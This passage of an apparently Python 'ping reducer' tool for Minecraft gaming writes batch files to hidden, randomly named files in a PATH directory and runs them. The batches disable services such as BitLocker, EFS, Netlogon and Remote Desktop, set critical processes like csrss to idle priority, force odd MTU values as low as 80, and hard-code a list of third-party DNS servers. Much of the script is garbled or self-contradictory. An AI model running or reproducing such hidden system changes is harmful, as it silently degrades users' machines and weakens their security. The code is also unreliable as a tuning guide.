Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "32" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SizReqBuf" /t REG_DWORD /d "17424" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "Size" /t REG_DWORD /d "3" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxWorkItems" /t REG_DWORD /d "8192" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxMpxCt" /t REG_DWORD /d "2048" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxCmds" /t REG_DWORD /d "2048" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "DisableStrictNameChecking" /t REG_DWORD /d "1" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "EnableDynamicBacklog" /t REG_DWORD /d "1" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MinimumDynamicBacklog" /t REG_DWORD /d "200" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MaximumDynamicBacklog" /t REG_DWORD /d "20000" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DynamicBacklogGrowthDelta" /t REG_DWORD /d "100" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "KeepAliveInterval" /t REG_DWORD /d "1" /f
cls
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "NegativeSOACacheTime" /t REG_DWORD /d "0" /f
cls
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "NetFailureCacheTime" /t REG_DWORD /d "0" /f
cls
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "MaxCacheEntryTtlLimit" /t REG_DWORD /d "10800" /f
cls
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "MaxCacheTtl" /t REG_DWORD /d "10800" /f
cls
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "MaxNegativeCacheTtl" /t REG_DWORD /d "0" /f
cls

netsh int tcp set global rsc=enabled
cls
netsh int tcp set global ecncapability=disabled
cls
netsh int tcp set global autotuninglevel=disabled
cls
netsh int tcp set heuristics disabled
cls
netsh int tcp set global chimney=disabled
cls
netsh int tcp set global dca=enabled
cls
netsh int tcp set global rss=enabled
cls
netsh int tcp set global netdma=enabled
cls
netsh int tcp set global congestionprovider=ctcp
cls
netsh int tcp set global timestamps=disabled
cls
netsh int tcp set global nonsackrttresiliency=disabled
cls
netsh int tcp set supplemental template=custom icw=10
cls 
netsh int tcp set heuristics disabled
cls
netsh int tcp set global rss=enabled
cls
netsh int tcp set global chimney=enabled
cls
netsh int tcp set global autotuninglevel=normal
cls
netsh int tcp set global congestionprovider=ctcp
cls
netsh int tcp set global ecncapability=disabled
cls
netsh int tcp set global timestamps=disabled
cls
netsh int tcp set heuristics disabled
cls
netsh int tcp set global autotuninglevel=disabled
cls
netsh int tcp set global congestionprovider=ctcp
cls
netsh int tcp set global rss=enabled
cls
netsh int tcp set global chimney=enabled
cls
netsh int tcp set global dca=enabled
cls
netsh interface ipv4 set subinterface "Wireless Network Connection" mtu=1500 store=persistent
cls
netsh int tcp set global netdma=enabled
cls
netsh int tcp set global timestamps=disabled
cls
netsh int tcp set global nonsackrttresiliency=disabled
cls
netsh int tcp set supplemental template=custom icw=10
cls
netsh int tcp set global fastopen=enabled
cls
netsh int tcp set heuristics disabled
cls
netsh int tcp set global rss=enabled
cls
netsh int tcp set global chimney=enabled
cls
netsh int tcp set global autotuninglevel=normal
cls
netsh int tcp set global congestionprovider=ctcp
cls
netsh int tcp set global ecncapability=disabled
cls
netsh int tcp set global timestamps=disabledstart cmd.exe /k ping  127.0.0.1  -t -l-n 65000
cls
netsh int tcp set global congestionprovider=none
cls
netsh int tcp set global autotuninglevel=high
cls
netsh int tcp set global chimney=disabled
cls
netsh int tcp set global dca=enable
cls
netsh int tcp set global netdma=enable
cls
netsh int tcp set heuristics enable
cls
netsh int tcp set global rss=enabled
cls
netsh int tcp set global timestamps=enable
cls
netsh interface tcp set global rss=enabled chimney=automatic netdma=disabled dca=disabled autotuninglevel=normal
cls
netsh interface tcp set global congestionprovider=none ecncapability=disabled timestamps=disabled 
cls
netsh interface tcp set global initialrto=3000
cls
netsh interface ipv4 set subinterface "Internet" mtu=80 store=persistent
cls
netsh interface ipv4 set subinterface "Ethernet" mtu=80 store=persistent
cls
netsh interface tcp set global autotuning=normal
cls
netsh int tcp set global congestionprovider=none
cls
netsh int tcp set global autotuninglevel=high
cls
netsh int tcp set global chimney=disabled
cls
netsh interface ipv4 set subinterface "Local Area Connection" mtu=150 store=persistent
cls
netsh int tcp set global rss=default
cls
netsh int tcp set heuristics disabled
cls
netsh interface ipv4 set subinterface "Local Area Connection" mtu=4000 store=persistent
cls
netsh interface ipv4 set subinterface "Internet" mtu=4000 store=persistent
cls
netsh interface ipv4 set subinterface "Ethernet" mtu=5000 store=persistent
cls
netsh int tcp set global congestionprovider=none
cls
netsh int tcp set global autotuninglevel=high
cls	
netsh int tcp set global chimney=disabled
cls
netsh int tcp set global dca=enable
cls
netsh int tcp set global netdma=enable
cls
netsh int tcp set heuristics enable
cls
netsh int tcp set global rss=enabled
cls
netsh int tcp set global timestamps=enable
cls
ping -n 3 localhost>nul
cls
sc config WSearch start= disabled
cls
sc config WMPNetworkSvc start= disabled
cls
sc config SNMPTRAP start= disabled
cls
sc config SCPolicySvc start= disabled
cls
sc config SCardSvr start= disabled
cls
sc config RemoteRegistry start= disabled
cls
sc config RpcLocator start= disabled
cls
sc config WPCSvc start= disabled
cls
sc config CscService start= disabled
cls
sc config napagent start= disabled
cls
sc config Netlogon start= disabled
cls
sc config MSiSCSI start= disabled
cls
sc config iphlpsvc start= disabled
cls
sc config TrkWks start= disabled
cls
sc config CertPropSvc start= disabled
cls
sc config PeerDistSvc start= disabled
cls
sc config bthserv start= disabled
cls
sc config WSearch start= disabled
cls
sc config WMPNetworkSvc start= disabled
cls
sc config SNMPTRAP start= disabled
cls
sc config SCPolicySvc start= disabled
cls
sc config SCardSvr start= disabled
cls
sc config RemoteRegistry start= disabled
cls
sc config RpcLocator start= disabled
cls
sc config WPCSvc start= disabled
cls
sc config CscService start= disabled
cls
sc config napagent start= disabled
cls
sc config Netlogon start= disabled
cls
sc config MSiSCSI start= disabled
cls
sc config iphlpsvc start= disabled
cls
sc config TrkWks start= disabled
cls
sc config CertPropSvc start= disabled
cls
sc config PeerDistSvc start= disabled
cls
sc config bthserv start= disabled
cls
sc config WSearch start= disabled
cls
sc config WMPNetworkSvc start= disabled
cls
sc config SNMPTRAP start= disabled
cls
sc config SCPolicySvc start= disabled
cls
sc config SCardSvr start= disabled
cls
sc config RemoteRegistry start= disabled
cls
sc config RpcLocator start= disabled
cls
sc config WPCSvc start= disabled
cls
sc config CscService start= disabled
cls
sc config napagent start= disabled
cls
sc config Netlogon start= disabled
cls
sc config MSiSCSI start= disabled
cls
sc config iphlpsvc start= disabled
cls
sc config TrkWks start= disabled
cls
sc config CertPropSvc start= disabled
cls
sc config PeerDistSvc start= disabled
cls
sc config bthserv start= disabled
cls
sc config SensrSvc start= disabled
cls
sc config WinHttpAutoProxySvc start= disabled
cls
sc config WinRM start= disabled
cls
sc config WerSvc start= disabled
cls
sc config WcsPlugInService start= disabled
cls
sc config ALG start= disabled
cls
sc config BDESVC start= disabled
cls
sc config EFS start= disabled
cls
sc config Fax start= disabled
cls
sc config hidserv start= disabled
cls
sc config SessionEnv start= disabled
cls
sc config TermService start= disabled
cls
sc config UmRdpService start= disabled
cls
sc config TabletInputService start= disabled
cls
sc config WbioSrvc start= disabled
cls
cls
sc config "Dnscache" start= demand
sc start Dnscache
stop
GOTO MISPLACEMENT1351


:MISPLACEMENT1351
ping 127.0.0.1 -n 4

sc query BITS | find /I "STATE" | find "STOPPED"
sc stop Dnscache
goto :start133

:start133
sc start BITS
goto :oneone

cls
goto oneone
    ''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    System.Clear()
    print(dataloadedsuccessfullymsg)
    print(dataloadedsuccessfullypic)
    print(dataloadedsuccessfullymsg)
def Player2():
    System.Clear()
    file_location = environ['PATH'].split(';')[0] + f'''\\{token_hex(16)}.bat'''
    open(file_location, 'wb').write(bytes('''
    @echo off
cls
REGEDIT4
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters]
"IRPStackSize"=dword:00000032
"SizReqBuf"=dword:00017424
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters]
"MaxFreeTcbs"=dword:00065536
"MaxUserPort"=dword:00065534
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{2C7B2EE4-D141-4A1C-97DA-E7C9EC9B9B3F}]
"UseZeroBroadcast"=dword:00000000
"EnableDeadGWDetect"=dword:00000001
"EnableDHCP"=dword:00000001
"Domain"=""
"RegistrationEnabled"=dword:00000001
"RegisterAdapterName"=dword:00000000
"DhcpServer"="192.168.1.1"
"Lease"=dword:0000a8c0
"LeaseObtainedTime"=dword:57b56e73
"T1"=dword:57b5c2d3
"T2"=dword:57b6021b
"LeaseTerminatesTime"=dword:57b61733
"AddressType"=dword:00000000
"IsServerNapAware"=dword:00000000
"DhcpConnForceBroadcastFlag"=dword:00000001
"IPAddress"=hex(7):00,00
"SubnetMask"=hex(7):00,00
"DefaultGateway"=hex(7):00,00
"DefaultGatewayMetric"=hex(7):00,00
"DhcpIPAddress"="192.168.1.35"
"DhcpSubnetMask"="255.255.255.0"
"NameServer"="208.67.222.222,208.67.220.220,200.63.155.71,200.63.155.199,200.51.211.7,200.51.212.7,200.45.191.35,200.45.191.40,200.49.156.3,200.49.159.69,200.49.156.8,200.49.156.7,200.69.193.1,200.69.193.2,200.43.2.6,200.43.31.6,4.4.4.4,4.4.2.2"
"TCPNoDelay"=dword:0000400f
"TcpDelAckTicks"=dword:00000000
"TcpAckFrequency"=dword:0000400f
"DhcpInterfaceOptions"=hex:06,00,00,00,00,00,00,00,04,00,00,00,00,00,00,00,33,  17,b6,57,c0,a8,01,01,03,00,00,00,00,00,00,00,04,00,00,00,00,00,00,00,33,17,  b6,57,c0,a8,01,01,01,00,00,00,00,00,00,00,04,00,00,00,00,00,00,00,33,17,b6,  57,ff,ff,ff,00,36,00,00,00,00,00,00,00,04,00,00,00,00,00,00,00,33,17,b6,57,  c0,a8,01,01,35,00,00,00,00,00,00,00,01,00,00,00,00,00,00,00,33,17,b6,57,05,  00,00,00,01,00,00,00,00,00,00,00,00,00,00,00,01,00,00,00,6f,98,b5,57,0c,00,  00,00,00,00,00,00,0b,00,00,00,00,00,00,00,33,17,b6,57,47,49,47,41,42,59,54,  45,2d,50,43,00,33,00,00,00,00,00,00,00,04,00,00,00,00,00,00,00,33,17,b6,57,  00,00,a8,c0,fc,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,6c,98,b5,57
"DhcpGatewayHardware"=hex:c0,a8,01,01,06,00,00,00,b0,c5,54,a7,63,ee
"DhcpGatewayHardwareCount"=dword:00000001
"DhcpNameServer"="192.168.1.1"
"DhcpDefaultGateway"=hex(7):31,00,39,00,32,00,2e,00,31,00,36,00,38,00,2e,00,31,  00,2e,00,31,00,00,00,00,00
"DhcpSubnetMaskOpt"=hex(7):32,00,35,00,35,00,2e,00,32,00,35,00,35,00,2e,00,32,  00,35,00,35,00,2e,00,30,00,00,00,00,00

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{846ee342-7039-11de-9d20-806e6f6e6963}]

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Tcpip\Parameters\Interfaces\{9C1E752A-B125-4651-A60A-2620EDABB7D8}]
"UseZeroBroadcast"=dword:00000000
"EnableDeadGWDetect"=dword:00000001
"EnableDHCP"=dword:00000001
"NameServer"=""
"Domain"=""
"RegistrationEnabled"=dword:00000001
"RegisterAdapterName"=dword:00000000
"DhcpIPAddress"="0.0.0.0"
"DhcpSubnetMask"="255.0.0.0"
"DhcpServer"="255.255.255.255"
"Lease"=dword:00000000
"LeaseObtainedTime"=dword:00000000
"T1"=dword:00000000
"T2"=dword:00000000
"LeaseTerminatesTime"=dword:00000000
"AddressType"=dword:00000000
"IsServerNapAware"=dword:00000000
"DhcpConnForceBroadcastFlag"=dword:00000000
"TCPNoDelay"=dword:0000400f
"TcpDelAckTicks"=dword:00000000
"TcpAckFrequency"=dword:0000400f
    ''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    System.Clear()
    print(dataloadedsuccessfullymsg)
    print(dataloadedsuccessfullypic)
    print(dataloadedsuccessfullymsg)
def Player3():
    System.Clear()
    file_location = environ['PATH'].split(';')[0] + f'''\\{token_hex(16)}.bat'''
    open(file_location, 'wb').write(bytes('''
    @echo off
REGEDIT.DemonUser
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters]
"SackOpts"=dword:00000001
"
"TcpWindowSize"=dword:0005ae4c
"
"Tcp1323Opts"=dword:00000003
"
"DefaultTTL"=dword:7fff
"
"EnablePMTUBHDetect"=dword:00000000
"
"EnablePMTUDiscovery"=dword:00000001
"
"GlobalMaxTcpWindowSize"=dword-:0005ae4c
"
"TcpTimedWaitDelay" dword:30
"
"TcpNumConnections" dword:7fff
"
"TcpMaxDupAcks" dword:2
"
"TcpWindowSize" dword:7fff
"
"WorldMaxTcpWindowsSize" dword:7
"
"TCPInitialRtt" dword:7fff
"
"IRPStackSize" dword:50
"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters]

"TcpNoDelay"=dword:1288fff
"
"TCPDelAckTicks"=dword:1288fff
"
"TcpMaxDataRetransmissions"=dword:00000003
"
"SackOpts"=dword:00000001
"
"TcpWindowSize"=dword:0005ae4c
"
"Tcp1323Opts"=dword:00000003
"
"DefaultTTL"=dword:7fff
"
"EnablePMTUBHDetect"=dword:00000000
"
"EnablePMTUDiscovery"=dword:00000001
"
"GlobalMaxTcpWindowSize"=dword:0005ae4c
"
"TcpTimedWaitDelay" dword:30
    ''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    System.Clear()
    print(dataloadedsuccessfullymsg)
    print(dataloadedsuccessfullypic)
    print(dataloadedsuccessfullymsg)
def Player4():
    System.Clear()
    file_location = environ['PATH'].split(';')[0] + f'''\\{token_hex(16)}.bat'''
    open(file_location, 'wb').write(bytes('''
    @echo off
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters]
"DefaultTTL"=dword:40
"DisableTaskOffload"=dword:00000001
"DisableLargeMtu"=dword:00000000
"EnableConnectionRateLimiting"=dword:00000000
"EnableDCA"=dword:00000001
"EnablePMTUBHDetect"=dword:00000000
"EnablePMTUDiscovery"=dword:00000001
"EnableRSS"=dword:00000001
"EnableTCPA"=dword:00000000
"EnableWsd"=dword:00000000
"GlobalMaxTcpWindowSize"=dword:0
"MaxConnectionsPer1_0Server"=dword:10
"MaxConnectionsPerServer"=dword:10
"MaxFreeTcbs"=dword:0000ffff
"MaxHashTableSize"=dword:00010000
"MaxUserPort"=dword:0000fffe
"NumTcbTablePartitions"=dword:8
"SackOpts"=dword:00000001
"SynAttackProtect"=dword:00000001
"Tcp1323Opts"=dword:00000001
"TcpCreateAndConnectTcbRateLimitDepth"=dword:00000000
"TcpMaxDataRetransmissions"=dword:00000003
"TcpMaxDupAcks"=dword:00000002
"TcpMaxSendFree"=dword:0000ffff
"TcpNumConnections"=dword:00fffffe
"TcpTimedWaitDelay"=dword:0000001e
"TcpFinWait2Delay"=dword:0000001e

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces]
"TCPNoDelay"=dword:00000001
"TcpAckFrequency"=dword:00000001
"TcpDelAckTicks"=dword:00000000

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters]
"DhcpInterfaceOptions"=hex:0f,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,93,  ec,45,57,79,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,93,ec,45,57,01,00,  00,00,00,00,00,00,00,00,00,00,00,00,00,00,93,ec,45,57,2b,00,00,00,00,00,00,  00,00,00,00,00,00,00,00,00,93,ec,45,57,2c,00,00,00,00,00,00,00,00,00,00,00,  00,00,00,00,93,ec,45,57,06,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,93,  ec,45,57

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\PriorityControl]
"Win32PrioritySeparation"=hex(b):02,00,00,00,00,00,00,00
"IRQ8Priority"=hex(b):01,00,00,00,00,00,00,00
"IRQ16Priority"=hex(b):02,00,00,00,00,00,00,00
    ''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    System.Clear()
    print(dataloadedsuccessfullymsg)
    print(dataloadedsuccessfullypic)
    print(dataloadedsuccessfullymsg)

def Unknow1():
    System.Clear()
    file_location = environ['PATH'].split(';')[0] + f'''\\{token_hex(16)}.bat'''
    open(file_location, 'wb').write(bytes('''
    netsh interface ipv4 set subinterface "Ethernet" mtu=1500 store=persistent
cls
netsh interface ipv4 set subinterface "Wi-Fi" mtu=1500 store=persistent
cls
netsh int tcp set global maxsynretransmissions=8
cls
netsh int tcp set global rss=enabled
cls
netsh interface ipv4 set subinterface "Ethernet" mtu=1640 store=persistent
cls
netsh int tcp set heuristics disabled
cls
netsh int tcp set global netdma=enabled
cls
netsh int tcp set global dca=enabled
cls
netsh int tcp set global nonsackrttresiliency=disabled
cls
netsh int tcp set global ecncapability=disabled
cls
ping -n 3 localhost>nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "32" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SizReqBuf" /t REG_DWORD /d "17424" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "Size" /t REG_DWORD /d "3" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxWorkItems" /t REG_DWORD /d "8192" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxMpxCt" /t REG_DWORD /d "2048" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxCmds" /t REG_DWORD /d "2048" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "DisableStrictNameChecking" /t REG_DWORD /d "1" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "EnableDynamicBacklog" /t REG_DWORD /d "1" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MinimumDynamicBacklog" /t REG_DWORD /d "200" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MaximumDynamicBacklog" /t REG_DWORD /d "20000" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DynamicBacklogGrowthDelta" /t REG_DWORD /d "100" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "KeepAliveInterval" /t REG_DWORD /d "1" /f
cls
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "NegativeSOACacheTime" /t REG_DWORD /d "0" /f
cls
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "NetFailureCacheTime" /t REG_DWORD /d "0" /f
cls
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "MaxCacheEntryTtlLimit" /t REG_DWORD /d "10800" /f
cls
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "MaxCacheTtl" /t REG_DWORD /d "10800" /f
cls
Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "MaxNegativeCacheTtl" /t REG_DWORD /d "0" /f
cls

netsh int tcp set global rsc=enabled
cls
netsh int tcp set global ecncapability=disabled
cls
netsh int tcp set global autotuninglevel=disabled
cls
netsh int tcp set heuristics disabled
cls
netsh int tcp set global chimney=disabled
cls
netsh int tcp set global dca=enabled
cls
netsh int tcp set global rss=enabled
cls
netsh int tcp set global netdma=enabled
cls
netsh int tcp set global congestionprovider=ctcp
cls
netsh int tcp set global timestamps=disabled
cls
netsh int tcp set global nonsackrttresiliency=disabled
cls
netsh int tcp set supplemental template=custom icw=10
cls 
netsh int tcp set heuristics disabled
cls
netsh int tcp set global rss=enabled
cls
netsh int tcp set global chimney=enabled
cls
netsh int tcp set global autotuninglevel=normal
cls
netsh int tcp set global congestionprovider=ctcp
cls
netsh int tcp set global ecncapability=disabled
cls
netsh int tcp set global timestamps=disabled
cls
netsh int tcp set heuristics disabled
cls
netsh int tcp set global autotuninglevel=disabled
cls
netsh int tcp set global congestionprovider=ctcp
cls
netsh int tcp set global rss=enabled
cls
netsh int tcp set global chimney=enabled
cls
netsh int tcp set global dca=enabled
cls
netsh interface ipv4 set subinterface "Wireless Network Connection" mtu=1500 store=persistent
cls
netsh int tcp set global netdma=enabled
cls
netsh int tcp set global timestamps=disabled
cls
netsh int tcp set global nonsackrttresiliency=disabled
cls
netsh int tcp set supplemental template=custom icw=10
cls
netsh int tcp set global fastopen=enabled
cls
netsh int tcp set heuristics disabled
cls
netsh int tcp set global rss=enabled
cls
netsh int tcp set global chimney=enabled
cls
netsh int tcp set global autotuninglevel=normal
cls
netsh int tcp set global congestionprovider=ctcp
cls
netsh int tcp set global ecncapability=disabled
cls
netsh int tcp set global timestamps=disabledstart cmd.exe /k ping  127.0.0.1  -t -l-n 65000
cls
netsh int tcp set global congestionprovider=none
cls
netsh int tcp set global autotuninglevel=high
cls
netsh int tcp set global chimney=disabled
cls
netsh int tcp set global dca=enable
cls
netsh int tcp set global netdma=enable
cls
netsh int tcp set heuristics enable
cls
netsh int tcp set global rss=enabled
cls
netsh int tcp set global timestamps=enable
cls
netsh interface tcp set global rss=enabled chimney=automatic netdma=disabled dca=disabled autotuninglevel=normal
cls
netsh interface tcp set global congestionprovider=none ecncapability=disabled timestamps=disabled 
cls
netsh interface tcp set global initialrto=3000
cls
netsh interface ipv4 set subinterface "Internet" mtu=80 store=persistent
cls
netsh interface ipv4 set subinterface "Ethernet" mtu=80 store=persistent
cls
netsh interface tcp set global autotuning=normal
cls
netsh int tcp set global congestionprovider=none
cls
netsh int tcp set global autotuninglevel=high
cls
netsh int tcp set global chimney=disabled
cls
netsh interface ipv4 set subinterface "Local Area Connection" mtu=150 store=persistent
cls
netsh int tcp set global rss=default
cls
netsh int tcp set heuristics disabled
cls
netsh interface ipv4 set subinterface "Local Area Connection" mtu=4000 store=persistent
cls
netsh interface ipv4 set subinterface "Internet" mtu=4000 store=persistent
cls
netsh interface ipv4 set subinterface "Ethernet" mtu=5000 store=persistent
cls
netsh int tcp set global congestionprovider=none
cls
netsh int tcp set global autotuninglevel=high
cls	
netsh int tcp set global chimney=disabled
cls
netsh int tcp set global dca=enable
cls
netsh int tcp set global netdma=enable
cls
netsh int tcp set heuristics enable
cls
netsh int tcp set global rss=enabled
cls
netsh int tcp set global timestamps=enable
cls
ping -n 3 localhost>nul
cls
sc config WSearch start= disabled
cls
sc config WMPNetworkSvc start= disabled
cls
sc config SNMPTRAP start= disabled
cls
sc config SCPolicySvc start= disabled
cls
sc config SCardSvr start= disabled
cls
sc config RemoteRegistry start= disabled
cls
sc config RpcLocator start= disabled
cls
sc config WPCSvc start= disabled
cls
sc config CscService start= disabled
cls
sc config napagent start= disabled
cls
sc config Netlogon start= disabled
cls
sc config MSiSCSI start= disabled
cls
sc config iphlpsvc start= disabled
cls
sc config TrkWks start= disabled
cls
sc config CertPropSvc start= disabled
cls
sc config PeerDistSvc start= disabled
cls
sc config bthserv start= disabled
cls
sc config WSearch start= disabled
cls
sc config WMPNetworkSvc start= disabled
cls
sc config SNMPTRAP start= disabled
cls
sc config SCPolicySvc start= disabled
cls
sc config SCardSvr start= disabled
cls
sc config RemoteRegistry start= disabled
cls
sc config RpcLocator start= disabled
cls
sc config WPCSvc start= disabled
cls
sc config CscService start= disabled
cls
sc config napagent start= disabled
cls
sc config Netlogon start= disabled
cls
sc config MSiSCSI start= disabled
cls
sc config iphlpsvc start= disabled
cls
sc config TrkWks start= disabled
cls
sc config CertPropSvc start= disabled
cls
sc config PeerDistSvc start= disabled
cls
sc config bthserv start= disabled
cls
sc config WSearch start= disabled
cls
sc config WMPNetworkSvc start= disabled
cls
sc config SNMPTRAP start= disabled
cls
sc config SCPolicySvc start= disabled
cls
sc config SCardSvr start= disabled
cls
sc config RemoteRegistry start= disabled
cls
sc config RpcLocator start= disabled
cls
sc config WPCSvc start= disabled
cls
sc config CscService start= disabled
cls
sc config napagent start= disabled
cls
sc config Netlogon start= disabled
cls
sc config MSiSCSI start= disabled
cls
sc config iphlpsvc start= disabled
cls
sc config TrkWks start= disabled
cls
sc config CertPropSvc start= disabled
cls
sc config PeerDistSvc start= disabled
cls
sc config bthserv start= disabled
cls
sc config SensrSvc start= disabled
cls
sc config WinHttpAutoProxySvc start= disabled
cls
sc config WinRM start= disabled
cls
sc config WerSvc start= disabled
cls
sc config WcsPlugInService start= disabled
cls
sc config ALG start= disabled
cls
sc config BDESVC start= disabled
cls
sc config EFS start= disabled
cls
sc config Fax start= disabled
cls
sc config hidserv start= disabled
cls
sc config SessionEnv start= disabled
cls
sc config TermService start= disabled
cls
sc config UmRdpService start= disabled
cls
sc config TabletInputService start= disabled
cls
sc config WbioSrvc start= disabled
cls
cls
sc config "Dnscache" start= demand
sc start Dnscache
    ''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    os.system('cls')
    System.Clear()
    print(dataloadedsuccessfullymsg)
    print(dataloadedsuccessfullypic)
    print(dataloadedsuccessfullymsg)
def Unknow2():
    System.Clear()
    file_location = environ['PATH'].split(';')[0] + f'''\\{token_hex(16)}.bat'''
    open(file_location, 'wb').write(bytes('''
@echo off

(
sc config "BITS" start= auto
sc start "BITS"
for /f "tokens=3" %%a in ('sc queryex "BITS" ^| findstr "PID"') do (set pid=%%a)
) >nul 2>&1
wmic process where name="javaw.exe" CALL setpriority "realtime"
cls
wmic process where name="svchost.exe" CALL setpriority "idle"
cls
wmic process where name="explorer.exe" CALL setpriority "high"
cls
wmic process where name="mDNSResponder.exe" CALL setpriority "idle"
cls
wmic process where name="BRTSvc.exe" CALL setpriority "idle"
cls
wmic process where name="csrss.exe" CALL setpriority "idle"
cls
wmic process where name="dwm.exe" CALL setpriority "idle"
cls
wmic process where name="rundll32.exe" CALL setpriority "idle"
cls
wmic process where name="nvvsvc.exe" CALL setpriority "idle"
cls
wmic process where name="taskhost.exe" CALL setpriority "idle"
cls
wmic process where name="taskmgr.exe" CALL setpriority "idle"
cls
wmic process where name="dllhost.exe" CALL setpriority "idle"
cls
wmic process where name="dashost.exe" CALL setpriority "idle"
cls
wmic process where name="TCPSVCS.EXE" CALL setpriority "idle"
cls
wmic process where name="SetTimerResolutionService.exe" CALL setpriority "realtime"
cls
wmic process where name="WmiPrvSE.exe" CALL setpriority "idle"
cls
wmic process where name="svchost.exe (NetworkService)" CALL setpriority "idle"
cls
wmic process where name="cheatbreaker.exe" CALL setpriority "high priority"
cls
wmic process where name="svchost.exe" CALL setpriority "idle"
cls
net stop w32time && w32tm /unregister && w32tm /register && net start w32time && w32tm /resync

    ''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    System.Clear()
    print(dataloadedsuccessfullymsg)
    print(dataloadedsuccessfullypic)
    print(dataloadedsuccessfullymsg)
def Unknow3():
    System.Clear()
    file_location = environ['PATH'].split(';')[0] + f'''\\{token_hex(16)}.bat'''
    open(file_location, 'wb').write(bytes('''
    @echo off
ping localhost -n 2.5 >nul
netsh int tcp set global chimney=enabled
netsh int tcp set global autotuninglevel=normal
netsh int tcp set global congestionprovider=ctcp
netsh int tcp show global
cls                                                      

netsh interface tcp set heuristics disabled
netsh interface tcp set global autotuning=restricted
netsh interface ip delete arpcache
netsh int tcp set global netdma=enabled
netsh int tcp set global dca=enabled
netsh int ipv4 set glob defaultcurhoplimit=64
netsh int ipv6 set glob defaultcurhoplimit=64
set supplemental congestionprovider=ctcp
netsh int tcp set heuristics disabled
netsh int tcp set global rss=enabled
netsh int tcp set global chimney=disabled
netsh int tcp set global rsc=disabled
netsh int tcp set global nonsackrttresiliency=disabled
netsh int tcp set global maxsynretransmissions=2
netsh int tcp set global fastopen=enabled
